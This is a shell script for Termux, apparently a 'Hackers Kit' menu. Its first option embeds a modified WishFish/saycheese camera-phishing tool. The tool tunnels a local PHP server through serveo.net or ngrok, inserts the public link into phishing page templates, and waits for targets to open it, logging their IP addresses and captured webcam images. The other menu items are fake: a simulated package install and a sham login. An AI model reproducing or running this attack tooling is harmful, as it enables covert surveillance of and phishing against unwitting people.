#!/system/bin/sh

echo "";
echo "";
echo "";

echo -e "\e[31m \e[1m_   _            _                   \e[0m_  ___ _    ";
echo -e "\e[31m \e[1m| | | | __ _  ___| | _____ _ __ ___  \e[0m| |/ (_) |_ ";
echo -e "\e[31m \e[1m| |_| |/ _. |/ __| |/ / _ \ ;__/ __| \e[0m| ' /| | __|";
echo -e "\e[31m \e[1m|  _  | (_| | (__|   <  __/ |  \__ \ \e[0m| . \| | |_ ";
echo -e "\e[31m \e[1m|_| |_|\__,_|\___|_|\_\___|_|  |___/ \e[0m|_|\_\_|\__| \n";

echo -e "\e[34m ----> MENU: \e[0m \n";

echo -e "\e[1m\e[32m [1]\e[0m Controll a Camera";
echo -e "\e[1m\e[32m [2]\e[0m Advanced";
echo -e "\e[1m\e[32m [3]\e[0m Log in";
echo -e "\e[1m\e[32m [4]\e[0m Help";
echo -e "\e[1m\e[32m [5]\e[0m Exit";

read -p "kit_user@hacker ~> " input1;

case $input1 in
   "1" )
    echo -e "\e[33m Starting...\e[0m";
# Inspired by: github.com/thelinuxchoice/saycheese
# Modified by: github.com/kinghacker0/WishPhish

trap 'printf "\n";stop' 2

# banner() {

# echo -e "\033[31m __          _ _     _     \e[0m ______ _     _          ";
# echo -e "\033[31m \ \        / (_)   | |    \e[0m|  ____(_)   | |         ";
# echo -e "\033[31m  \ \  /\  / / _ ___| | __ \e[0m| |__   _ ___| |__       ";
# echo -e "\033[31m   \ \/  \/ / | / __| '_  |\e[0m|  __| | / __| '_ \      ";
# echo -e "\033[31m    \  /\  /  | \__ \ | | |\e[0m| |    | \__ \ | | |     ";
# echo -e "\033[31m     \/  \/   |_|___/_| |_|\e[0m|_|    |_|___/_| |_| v2.0";

# printf "\e[1;77m Website :- www.hackersking.in \e[0m \n"
# printf "\e[1;77m v2.0 Coded By github.com/kinghacker0 \e[0m \n"

# }

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}

payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' wishfish.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' wishfish.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="wishfish$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

dependencies
start1 ;;

 "2" ) 
  
echo -e " - \e[33mI require Advanced Package of Termux to oparate this. Would you like to install it?[Y/n] \e[0m";
read -p "kit_user@hacker ~> " aff;
case $aff in

    Y )
    echo "Installing - Advanced Package of Termux...";
    echo "receiving objects 1 of 12...";
    sleep 4;
    echo "receiving objects 2 of 11...";
    sleep 0.5;
    echo "receiving objects 3 of 11...";
    sleep 0.5;
    echo "receiving objects 4 of 11...";
    sleep 1.5;
    echo "receiving objects 5 of 11...";
    sleep 5;
    echo "receiving objects 6 of 11...";
    sleep 10;
    echo -e "\e[31E: Can't Mount /system ! Error in emmc@android: permission denied. (707)\e[0m";
    sleep 0.2;
    echo -e "\e[33W: Can't Access /system/bin/libcats/ ! /system is not Mounted! \e[0m";
    sleep 0.6;
    echo "Installation of object 6 of 11 aborted.";
    sleep 0.2;
    echo "receiving objects 7 of 11...";
    sleep 2;
    
    echo "receiving objects 8 of 11...";
    sleep 5;
    
    echo "receiving objects 9 of 11...";
    sleep 3;
    
    echo "receiving objects 10 of 11...";
    sleep 1;
    
    echo "receiving objects 11 of 11...";
    sleep 2.5;
    
    echo "All objects received.";
    sleep 0.2;
    echo -e "\e[1m\e[32m Installing objects...\e[0m";
    sleep 12;
    echo -e "\e[1m\e[32m[*] Successfully Installed Advanced Package of Termux.\e[0m";
 ;;
 
 "n" ) 
 echo "Abort."
 exit;
 ;;
 esac
 ;;
 "3" ) 
  echo "Log In";
  read -p "Username: " bkl;
  echo "Welcome, "$bkl"!";
  read -p "Password: " vnk;
  echo "Wrong Password!";
 ;;
 "4" )
 echo "Help: ";
 echo "For Help Go To This Link: ";
 echo "http://github.com/rakinar2/";
 ;;
 "5" )
 echo "Closing...";
 sleep 2;
 exit;
 ;;
esac
